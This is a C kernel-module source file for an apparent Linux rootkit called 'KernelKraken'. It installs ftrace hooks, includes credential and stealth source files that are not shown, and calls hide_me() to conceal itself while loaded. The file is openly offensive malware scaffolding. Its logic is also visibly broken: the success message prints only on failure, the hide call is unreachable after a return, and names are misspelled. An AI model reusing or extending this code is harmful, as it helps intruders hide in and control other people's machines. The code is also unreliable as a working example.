#include "headers/KernalKraken.h"
#include "headers/ftrace_helper.h"

#include "src/credentials.c"
#include "src/hooks.c"
#include "src/stealth.c"

static int setup(void) {
    int error;
    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (error)
            printk(KERN_INFO "KernelKraken: Initialized successfully!\n");
        return error;
hide_me();
    return 0;
}

static int teardown(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    show_me();
    return 0;
}

static void __exit kernal_kraken_exit(void) {
    printk(KERN_INFO "KernelKraken: Unloaded successfully!\n");
    teardown();
}

static int __init kernal_kraken_init(void) {
    setup();
    printk(KERN_INFO "KernelKraken: Loadeding...\n");
	return 0;
}

module_init(kernal_kraken_init);
module_exit(kernal_kraken_exit);